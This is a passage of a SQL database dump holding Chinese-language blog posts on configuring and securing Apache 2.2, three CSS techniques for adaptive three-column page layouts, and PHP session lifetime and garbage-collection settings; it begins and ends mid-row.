/>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # description: Apache is a World Wide Web server.<br />\r\n&nbsp;&nbsp; 保存后退出vi编辑器，执行下面的命令增加Apache服务控制脚本执行权限：<br />\r\nchmod&nbsp; +x&nbsp; /etc/init.d/apache<br />\r\n&nbsp;&nbsp; 执行下面的命令将Apache服务加入到系统服务：<br />\r\nchkconfig --add apache<br />\r\n&nbsp;&nbsp; 执行下面的命令检查Apache服务是否已经生效：<br />\r\nchkconfig --list apache<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 命令输出类似下面的结果：<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; apache&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0:off 1:off 2:on 3:on 4:on 5:on 6:off<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 表明apache服务已经生效，在2、3、4、5运行级别随系统启动而自动启动，以后可以使用service命令控制Apache的启动和停止。<br />\r\n启动Apache服务：<br />\r\nservice apache start<br />\r\n&nbsp;&nbsp; 停止Apache服务：<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; service apache stop<br />\r\n&nbsp;&nbsp; 执行下面的命令关闭开机自启动：<br />\r\nchkconfig apache off<br />\r\n&nbsp;&nbsp; 执行下面的命令改变开机自启动的运行级别为3、5：<br />\r\nchkconfig --level 35 apache on</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>3. Apache的配置</p>\r\n\r\n<p>源码包方式安装目录结构<br />\r\n源码包方式安装时通常是在configure命令的--prefix选项指定的目录中建立如下的目录结构，特殊指定的目录除外：<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ./icons&nbsp;&nbsp;&nbsp;&nbsp; #Apache图标文件目录<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ./modules&nbsp;&nbsp; #动态加载模块目录<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ./lib&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #库文件目录<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ./logs&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #日志文件目录<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ./build&nbsp;&nbsp;&nbsp;&nbsp; #<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ./conf&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #主配置文件目录<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ./conf/extra&nbsp;&nbsp;&nbsp;&nbsp; #扩展及模块配置文件目录<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ./error&nbsp;&nbsp;&nbsp;&nbsp; #默认错误应答文件目录<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ./manual&nbsp;&nbsp;&nbsp; #Apache文档目录<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ./include&nbsp;&nbsp; #包含头文件目录<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ./htdocs&nbsp;&nbsp;&nbsp; #默认WEB文档根目录<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ./cgi-bin&nbsp;&nbsp; #默认cgi文件目录<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ./bin&nbsp;&nbsp;&nbsp;&nbsp; #Apache二进制程序及服务程序目录<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ./man&nbsp;&nbsp;&nbsp;&nbsp; #man帮助文件目录</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>4. 配置文件 http.conf</p>\r\n\r\n<p>ServerRoot &quot;/usr/local/apache-2.2.15&quot;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ##设置服务器的基础目录,默认为Apache安装目录<br />\r\nListen 80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ##设置服务器监听的IP和端口<br />\r\nLoadModule authn_file_module modules/mod_authn_file.so<br />\r\nLoadModule authn_dbm_module modules/mod_authn_dbm.so<br />\r\nLoadModule authn_anon_module modules/mod_authn_anon.so<br />\r\nLoadModule authn_dbd_module modules/mod_authn_dbd.so<br />\r\nLoadModule authn_default_module modules/mod_authn_default.so<br />\r\nLoadModule authz_host_module modules/mod_authz_host.so<br />\r\nLoadModule authz_groupfile_module modules/mod_authz_groupfile.so<br />\r\nLoadModule authz_user_module modules/mod_authz_user.so<br />\r\nLoadModule authz_dbm_module modules/mod_authz_dbm.so<br />\r\nLoadModule authz_owner_module modules/mod_authz_owner.so<br />\r\nLoadModule authz_default_module modules/mod_authz_default.so<br />\r\nLoadModule auth_basic_module modules/mod_auth_basic.so<br />\r\nLoadModule auth_digest_module modules/mod_auth_digest.so<br />\r\nLoadModule dbd_module modules/mod_dbd.so<br />\r\nLoadModule dumpio_module modules/mod_dumpio.so<br />\r\nLoadModule reqtimeout_module modules/mod_reqtimeout.so<br />\r\nLoadModule ext_filter_module modules/mod_ext_filter.so<br />\r\nLoadModule include_module modules/mod_include.so<br />\r\nLoadModule filter_module modules/mod_filter.so<br />\r\nLoadModule substitute_module modules/mod_substitute.so<br />\r\nLoadModule deflate_module modules/mod_deflate.so<br />\r\nLoadModule log_config_module modules/mod_log_config.so<br />\r\nLoadModule logio_module modules/mod_logio.so<br />\r\nLoadModule env_module modules/mod_env.so<br />\r\nLoadModule expires_module modules/mod_expires.so<br />\r\nLoadModule headers_module modules/mod_headers.so<br />\r\nLoadModule ident_module modules/mod_ident.so<br />\r\nLoadModule setenvif_module modules/mod_setenvif.so<br />\r\nLoadModule version_module modules/mod_version.so<br />\r\nLoadModule mime_module modules/mod_mime.so<br />\r\nLoadModule dav_module modules/mod_dav.so<br />\r\nLoadModule status_module modules/mod_status.so<br />\r\nLoadModule autoindex_module modules/mod_autoindex.so<br />\r\nLoadModule asis_module modules/mod_asis.so<br />\r\nLoadModule info_module modules/mod_info.so<br />\r\nLoadModule cgid_module modules/mod_cgid.so<br />\r\nLoadModule dav_fs_module modules/mod_dav_fs.so<br />\r\nLoadModule vhost_alias_module modules/mod_vhost_alias.so<br />\r\nLoadModule negotiation_module modules/mod_negotiation.so<br />\r\nLoadModule dir_module modules/mod_dir.so<br />\r\nLoadModule imagemap_module modules/mod_imagemap.so<br />\r\nLoadModule actions_module modules/mod_actions.so<br />\r\nLoadModule speling_module modules/mod_speling.so<br />\r\nLoadModule userdir_module modules/mod_userdir.so<br />\r\nLoadModule alias_module modules/mod_alias.so<br />\r\nLoadModule rewrite_module modules/mod_rewrite.so<br />\r\n&lt;IfModule !mpm_netware_module&gt;<br />\r\nUser daemon&nbsp;&nbsp;&nbsp;&nbsp; ##设置实际提供服务的子进程的用户。<br />\r\nGroup daemon&nbsp;&nbsp;&nbsp; ##设置提供服务的Apache子进程运行时的用户组。<br />\r\n&lt;/IfModule&gt;<br />\r\nServerAdmin you@example.com&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ##设置在所有返回给客户端的错误信息中包含的管理员邮件地址。<br />\r\nServerName 192.168.221.128&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ##设置服务器用于辨识自己的主机名和端口号（用IP代替）。<br />\r\nDocumentRoot &quot;/usr/local/apache-2.2.15/htdocs&quot;&nbsp;&nbsp;&nbsp;&nbsp; ##设置Web文档根目录。<br />\r\n&lt;Directory /&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ###&lt;Directory&gt;和&lt;/Directory&gt;用于封装一组指令，使之仅对某个目录及其子目录生效。<br />\r\n&nbsp;&nbsp;&nbsp; Options FollowSymLinks<br />\r\n&nbsp;&nbsp;&nbsp; AllowOverride None<br />\r\n&nbsp;&nbsp;&nbsp; Order deny,allow<br />\r\n&nbsp;&nbsp;&nbsp; Deny from all<br />\r\n&lt;/Directory&gt;<br />\r\n&lt;Directory &quot;/usr/local/apache-2.2.15/htdocs&quot;&gt;&nbsp;&nbsp; ##设置DocumentRoot指定目录的属性<br />\r\n&nbsp;&nbsp;&nbsp; Options Indexes FollowSymLinks&nbsp;&nbsp;&nbsp; ##建议拿掉Indexes<br />\r\n&nbsp;&nbsp;&nbsp; AllowOverride None<br />\r\n&nbsp;&nbsp;&nbsp; Order allow,deny<br />\r\n&nbsp;&nbsp;&nbsp; Allow from all<br />\r\n&lt;/Directory&gt;<br />\r\n&lt;IfModule dir_module&gt;&nbsp;&nbsp;&nbsp; ##设置默认目录资源列表文件<br />\r\n&nbsp;&nbsp;&nbsp; DirectoryIndex index_top.html entrance.html index.html index.php index.htm index.asp index.php3<br />\r\n&lt;/IfModule&gt;<br />\r\n&lt;FilesMatch &quot;^\\.ht&quot;&gt;&nbsp;&nbsp;&nbsp;&nbsp; ##拒绝对.ht开头文件的访问,以保护.htaccess文件<br />\r\n&nbsp;&nbsp;&nbsp; Order allow,deny<br />\r\n&nbsp;&nbsp;&nbsp; Deny from all<br />\r\n&nbsp;&nbsp;&nbsp; Satisfy All<br />\r\n&lt;/FilesMatch&gt;<br />\r\nErrorLog &quot;logs/error_log&quot;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ##指定错误日志文件<br />\r\nLogLevel warn&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ##指定记录到错误日志的消息级别<br />\r\n&lt;IfModule log_config_module&gt;&nbsp;&nbsp;&nbsp; ##定义访问日志的格式<br />\r\n&nbsp;&nbsp;&nbsp; LogFormat &quot;%h %l %u %t \\&quot;%r\\&quot; %&gt;s %b \\&quot;%{Referer}i\\&quot; \\&quot;%{User-Agent}i\\&quot;&quot; combined<br />\r\n&nbsp;&nbsp;&nbsp; LogFormat &quot;%h %l %u %t \\&quot;%r\\&quot; %&gt;s %b&quot; common<br />\r\n&nbsp;&nbsp;&nbsp; &lt;IfModule logio_module&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; LogFormat &quot;%h %l %u %t \\&quot;%r\\&quot; %&gt;s %b \\&quot;%{Referer}i\\&quot; \\&quot;%{User-Agent}i\\&quot; %I %O&quot; combinedio<br />\r\n&nbsp;&nbsp;&nbsp; &lt;/IfModule&gt;<br />\r\n&nbsp;&nbsp;&nbsp; CustomLog &quot;logs/access_log&quot; common&nbsp;&nbsp;&nbsp; ##指定访问日志及使用的格式<br />\r\n&lt;/IfModule&gt;<br />\r\n&lt;IfModule alias_module&gt;&nbsp;&nbsp;&nbsp; ##设定默认CGI脚本目录及别名<br />\r\n&nbsp;&nbsp;&nbsp; ScriptAlias /cgi-bin/ &quot;/usr/local/apache-2.2.15/cgi-bin/&quot;<br />\r\n&lt;/IfModule&gt;<br />\r\n&lt;IfModule cgid_module&gt;<br />\r\n&lt;/IfModule&gt;<br />\r\n&lt;Directory &quot;/usr/local/apache-2.2.15/cgi-bin&quot;&gt;&nbsp;&nbsp;&nbsp; ##设定默认CGI脚本目录的属性<br />\r\n&nbsp;&nbsp;&nbsp; AllowOverride None<br />\r\n&nbsp;&nbsp;&nbsp; Options None<br />\r\n&nbsp;&nbsp;&nbsp; Order allow,deny<br />\r\n&nbsp;&nbsp;&nbsp; Allow from all<br />\r\n&lt;/Directory&gt;<br />\r\nDefaultType text/plain&nbsp;&nbsp;&nbsp; ##设定默认MIME内容类型<br />\r\n&lt;IfModule mime_module&gt;<br />\r\n&nbsp;&nbsp;&nbsp; TypesConfig conf/mime.types<br />\r\n&nbsp;&nbsp;&nbsp; AddType application/x-compress .Z<br />\r\n&nbsp;&nbsp;&nbsp; AddType application/x-gzip .gz .tgz<br />\r\n&lt;/IfModule&gt;<br />\r\n&lt;IfModule ssl_module&gt;<br />\r\nSSLRandomSeed startup builtin<br />\r\nSSLRandomSeed connect builtin<br />\r\n&lt;/IfModule&gt;</p>\r\n\r\n<p>&lt;IfModule mpm_worker_module&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ##编译参数 --with-mpm=worker时，使用worker.c模块<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ServerLimit&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 25&nbsp;&nbsp;&nbsp; ##/usr/local/apache-2.2.15/bin/apachectl -l查看使用模块<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ThreadLimit&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 200<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; StartServers&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 3<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; MaxClients&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 2000<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; MinSpareThreads&nbsp;&nbsp;&nbsp;&nbsp; 50<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; MaxSpareThreads&nbsp;&nbsp;&nbsp; 200<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ThreadsPerChild&nbsp;&nbsp;&nbsp; 100<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; MaxRequestsPerChild&nbsp; 1000<br />\r\n&lt;/IfModule&gt;</p>\r\n\r\n<p>Timeout 15<br />\r\nKeepAlive On<br />\r\nMaxKeepAliveRequests 100<br />\r\nKeepAliveTimeout 3<br />\r\nUseCanonicalName Off<br />\r\nAccessFileName .htaccess<br />\r\nServerTokens Prod<br />\r\nServerSignature Off<br />\r\nHostnameLookups Off</p>\r\n\r\n<p>NameVirtualHost *:80<br />\r\n&lt;VirtualHost *:80&gt;<br />\r\n&nbsp;&nbsp;&nbsp; DocumentRoot /usr/local/apache-2.2.15/htdocs/irene<br />\r\n&nbsp;&nbsp;&nbsp; ServerName www.irene.com<br />\r\n&lt;/VirtualHost&gt;<br />\r\n&lt;VirtualHost *:80&gt;<br />\r\n&nbsp;&nbsp;&nbsp; DocumentRoot /usr/local/apache-2.2.15/htdocs/angel<br />\r\n&nbsp;&nbsp;&nbsp; ServerName www.angel.com<br />\r\n&lt;/VirtualHost&gt;</p>\r\n\r\n<p>-----------------------------------------------------------------------------------------</p>\r\n\r\n<p>4. 认证和授权配置</p>\r\n\r\n<p>## 在httpd.conf配置文件中添加如下代码</p>\r\n\r\n<p>&lt;Directory &quot;/usr/local/apache-2.2.15/htdocs/protect&quot;&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; AllowOverride None&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ## 不使用.htaccess文件<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; AuthType Basic&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ## 指定使用基本认证方式<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; AuthName &quot;apache.passwd&quot;&nbsp;&nbsp;&nbsp; ## 指定认证领域名称<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; AuthUserFile /usr/local/apache-2.2.15/htdocs/protect/apache.passwd&nbsp; ## 认证口令存放位置<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; require valid-user&nbsp;&nbsp;&nbsp;&nbsp; ## 授权给认证口令文件中的所有用户<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #Order allow,deny<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #Allow from all<br />\r\n&lt;/Directory&gt;</p>\r\n\r\n<p>** 由于文本中 DocumentRoot &quot;/usr/local/apache-2.2.15/htdocs&quot; 已经指定了你的文档根目录</p>\r\n\r\n<p>** 所以在这个目录下建立相关目录作为指定的保护文档位置</p>\r\n\r\n<p>** 也可以使用Alias别名 指定一个其他目录</p>\r\n\r\n<p>[root@test-AS4 ~]# cd /usr/local/apache-2.2.15/htdocs</p>\r\n\r\n<p>[root@test-AS4 htdocs]# mkdir protect</p>\r\n\r\n<p>[root@test-AS4 protect]# htpasswd -c apache.passwd angel</p>\r\n\r\n<p>[root@test-AS4 protect]# ll<br />\r\ntotal 8<br />\r\n-rw-r--r--&nbsp; 1 root root 20 Mar 14 21:14 apache.passwd<br />\r\n[root@test-AS4 protect]# cat apache.passwd<br />\r\nangel:Grka1xfi6y5RM<br />\r\n[root@test-AS4 protect]#</p>\r\n\r\n<p>## 打开浏览器URL: http://192.168.221.128/protect/</p>\r\n',0,1437660488,0,0),(40,29,'我熟知的三种三栏网页宽度自适应布局方法','<p>一、前言<br />\r\n在如今各个分辨率显示器N足鼎立的时期，页面采用流动性布局（亦可称自适应布局）不失为一个好选择。当然，具体实现不是那么容易，需要一定的css功力和 实践经验。本文不讲细节，只讲外部的自适应架构，这也是实现整个页面自适应的前提。目前为止，我所熟知的左中右三栏宽度自适应于浏览器的方法有三个：绝对定位法，margin负值法以及自身浮动法。这些方法简洁实用，且无兼容性问题。如果您想在您的页面上使用流动性布局，相信本文给您一些启示的。</p>\r\n\r\n<p>二、三种方法<br />\r\n为了演示的需要，首先限定下示例的布局结构：左中右三栏布局，左右两栏宽度固定（要想不固定将宽度值改为百分值即可），中间栏宽度自适应。左右两栏的宽度为200像素。</p>\r\n\r\n<p>1、绝对定位法<br />\r\n这或许是三种方法里最直观，最容易理解的：左右两栏采用绝对定位，分别固定于页面的左右两侧，中间的主体栏用左右margin值撑开距离。于是实现了三栏自适应布局。</p>\r\n\r\n<p>您可以狠狠地点击这里：绝对定位法演示demo</p>\r\n\r\n<p>css代码如下（为截图）：</p>\r\n\r\n<p>HTML代码为（图片）：</p>\r\n\r\n<p>这里的左中右三个div的顺序是可以任意调整的，这与剩下的两中方法就不一样了，需要注意一下。</p>\r\n\r\n<p>此方法的优点是，理解容易，上手简单，受内部元素影响而破坏布局的概率低，就是比较经得起折腾。<br />\r\n缺点在于：如果中间栏含有最小宽度限制，或是含有宽度的内部元素，当浏览器宽度小到一定程度，会发生层重叠的情况。然而，一般情况下，除非用户显示器分辨率宽度&gt;=1600像素，否则用户不会把浏览器缩小到1000像素以下的，所以该缺陷危害指数3.</p>\r\n\r\n<p>2、margin负值法<br />\r\n这种方法是在实际的网站中应用的最多的，我个人感觉多少有些跟风的嫌疑。此方法很难用一句话概括。首先，中间的主体要使用双层标签。外层div宽度 100%显示，并且浮动（本例左浮动，下面所述依次为基础），内层div为真正的主体内容，含有左右210像素的margin值。左栏与右栏都是采用 margin负值定位的，左栏左浮动，margin-left为-100%，由于前面的div宽度100%与浏览器，所以这里的-100%margin值 正好使左栏div定位到了页面的左侧；右侧栏也是左浮动，其margin-left也是负值，大小为其本身的宽度即200像素。</p>\r\n\r\n<p>见下面的css代码：</p>\r\n\r\n<p>HTML代码：</p>\r\n\r\n<p>您可以狠狠地点击这里：margin负值法演示demo</p>\r\n\r\n<p>您需要注意几个div的顺序，无论是左浮动还是右浮动，先是主体部分div，这是肯定的，至于左右两栏谁先谁后，都无所谓，我测试了IE6，Firefox，以及chrome浏览器，表现一致。</p>\r\n\r\n<p>此方法的优点：三栏相互关联，可谓真正意义上的自适应，有一定的抗性&mdash;&mdash;布局不易受内部影响。<br />\r\n缺点在于：相对比较难理解些，上手不容易，代码相对复杂。出现百分比宽度，过多的负值定位，如果出现布局的bug，排查不易。</p>\r\n\r\n<p>3、自身浮动法<br />\r\n此方法代码最简单。应用了标签浮动跟随的特性。左栏左浮动，右栏右浮动，主体直接放后面，就实现了自适应。</p>\r\n\r\n<p>您可以狠狠地点击这里：自身浮动法演示demo</p>\r\n\r\n<p>css代码如下：</p>\r\n\r\n<p>HTML代码：</p>\r\n\r\n<p>这里三个div标签的顺序的关键是要把主体div放在最后，左右两栏div顺序任意。</p>\r\n\r\n<p>此方法的优点是：代码足够简洁与高效<br />\r\n不足在于：中间主体存在克星，clear:both属性。如果要使用此方法，需避免明显的clear样式。</p>\r\n\r\n<p>三、下载<br />\r\n您可以狠狠地单击这里：demo打包下载（zip ）</p>\r\n\r\n<p>四、结语<br />\r\ntable表格可谓是自适应布局的利器，如今Google的产品页面，yahoo等自适应页面都还是使用的table技术，原因在于table本身的自适 应能力。然而，虽然它是Google，它是yahoo，但是我依然很鄙视，您可以试试用firebug去看一下Google页面的HTML代 码，unbelievable！层级多的惊人，代码真是多，臃肿！我过去觉得可能是某些功能之需，现在发现是追求技术，可扩展，自适应的副产物。我多次实 践，可以非常肯定的说：div完全可以取代table实现自适应布局。</p>\r\n\r\n<p>本文提供的仅仅是我个人知道的几种自适应方法，其实，我相信，肯定还有其他的方法，这就需要你我对其关注思考并发现了。</p>\r\n\r\n<p>原创文章，转载请注明来自张鑫旭-鑫空间-鑫生活[http://www.zhangxinxu.com]<br />\r\n本文地址：http://www.zhangxinxu.com/wordpress/?p=370</p>\r\n',0,1437660692,0,0),(41,10,'PHP SESSION生存时间设置','<p>PHP中的session有效期默认是1440秒（24分钟）【weiweiok 注：php5里默认的是180分】，也就是说，客户端超过24分钟没有刷新，当前session就会失效。很明显，这是不能满足需要的。</p>\r\n\r\n<p>&nbsp;&nbsp; 一 个已知管用的方法是，使用session_set_save_handler，接管所有的session管理工作，一般是把session信息存储到数据 库，这样可以通过SQL语句来删除所有过期的session，精确地控制session的有效期。这也是基于PHP的大型网站常用的方法。但是，一般的小 型网站，似乎没有必要这么劳师动众。</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp; 但是一般的Session的生命期有限，如果用户关闭了浏览器，就不能保存Session的变量了！那么怎么样可以实现Session的永久生命期呢？</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; 大 家知道，Session储存在服务器端，根据客户端提供的SessionID来得到这个用户的文件，然后读取文件，取得变量的值，SessionID可以 使用客户端的Cookie或者Http1.1协议的Query_String（就是访问的URL的&ldquo;?&rdquo;后面的部分）来传送给服务器，然后服务器读取 Session的目录&hellip;&hellip;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; 要实现Session的永久生命期，首先需要了解一下php.ini关于Session的相关设置（打开php.ini文件，在&ldquo;[Session]&rdquo;部分）：</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; 1、session.use_cookies：默认的值是&ldquo;1&rdquo;，代表SessionID使用Cookie来传递，反之就是使用Query_String来传递；</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; 2、session.name：这个就是SessionID储存的变量名称，可能是Cookie，也可能是Query_String来传递，默认值是&ldquo;PHPSESSID&rdquo;；</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; 3、session.cookie_lifetime：这个代表SessionID在客户端Cookie储存的时间，默认是0，代表浏览器一关闭SessionID就作废&hellip;&hellip;就是因为这个所以Session不能永久使用！</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; 4、session.gc_maxlifetime：这个是Session数据在服务器端储存的时间，如果超过这个时间，那么Session数据就自动删除！</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; 还有很多的设置，不过和本文相关的就是这些了，下面开始讲使用永久Session的原理和步骤。</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; 前面说过，服务器通过SessionID来读取Session的数据，但是一般浏览器传送的SessionID在浏览器关闭后就没有了，那么我们只需要人为的设置SessionID并且保存下来，不就可以&hellip;&hellip;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; 如果你拥有服务器的操作权限，那么设置这个非常非常的简单，只是需要进行如下的步骤：</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; 1、把&ldquo;session.use_cookies&rdquo;设置为1，打开Cookie储存SessionID，不过默认就是1，一般不用修改；</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; 2、把&ldquo;session.cookie_lifetime&rdquo;改为正无穷（当然没有正无穷的参数，不过999999999和正无穷也没有什么区别）;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; 3、把&ldquo;session.gc_maxlifetime&rdquo;设置为和&ldquo;session.cookie_lifetime&rdquo;一样的时间；</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; 在 PHP的文档中明确指出，设定session有效期的参数是session.gc_maxlifetime。可以在php.ini文件中，或者通过 ini_set()函数来修改这一参数。问题在于，经过多次测试，修改这个参数基本不起作用，session有效期仍然保持24分钟的默认值。</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; 由 于PHP的工作机制，它并没有一个daemon线程，来定时地扫描session信息并判断其是否失效。当一个有效请求发生时，PHP会根据全局变量 session.gc_probability/session.gc_divisor（同样可以通过php.ini或者ini_set()函数来修改） 的值，来决定是否启动一个GC（Garbage Collector）。</p>\r\n\r\n<p>&nbsp;&nbsp; 默认情况 下，session.gc_probability ＝ 1，session.gc_divisor ＝100，也就是说有1%的可能性会启动GC。GC的工作，就是扫描所有的session信息，用当前时间减去session的最后修改时间 （modified date），同session.gc_maxlifetime参数进行比较，如果生存时间已经超过gc_maxlifetime，就把该session删 除。</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; 到此为止，工作一切正常。那为什么会发生gc_maxlifetime无效的情况呢？</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; 在 默认情况下，session信息会以文本文件的形式，被保存在系统的临时文件目录中。在Linux下，这一路径通常为\\tmp，在 Windows下通常为C:\\Windows\\Temp。当服务器上有多个PHP应用时，它们会把自己的session文件都保存在同一个目录中。同样 地，这些PHP应用也会按一定机率启动GC，扫描所有的session文件。</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; 问题在于，GC在工作时，并 不会区分不同站点的session。举例言之，站点A的gc_maxlifetime设置为2小时，站点B的 gc_maxlifetime设置为默认的24分钟。当站点B的GC启动时，它会扫描公用的临时文件目录，把所有超过24分钟的session文件全部删 除掉，而不管它们来自于站点A或B。这样，站点A的gc_maxlifetime设置就形同虚设了。</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; 找到问题所在，解决起来就很简单了。修改session.save_path参数，或者使用session_save_path()函数，把保存session的目录指向一个专用的目录，gc_maxlifetime参数工作正常了。</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; 严格地来说，这算是PHP的一个bug？</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; 还 有一个问题就是，gc_maxlifetime只能保证session生存的最短时间，并不能够保存在超过这一时间之后session信息立即会得到删 除。因为GC是按机率启动的，可能在某一个长时间内都没有被启动，那么大量的session在超过gc_maxlifetime以后仍然会有效。</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; 解 决这个问题的一个方法是，把session.gc_probability/session.gc_divisor的机率提高，如果提到100%，就会彻 底解决这个问题，但显然会对性能造成严重的影响。另一个方法是自己在代码中判断当前session的生存时间，如果超出了 gc_maxlifetime，就清空当前session。</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; 但是如果你没有服务器的操作权限，那就比较麻 烦了，你需要通过PHP程序改写SessionID来实现永久的Session数据保存。查查php.net的函数手册，可以见到有 &ldquo;session_id&rdquo;这个函数：如果没有设置参数，那么将返回当前的SessionID，如果设置了参数，就会将当前的SessionID设置为给出 的值&hellip;&hellip;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; 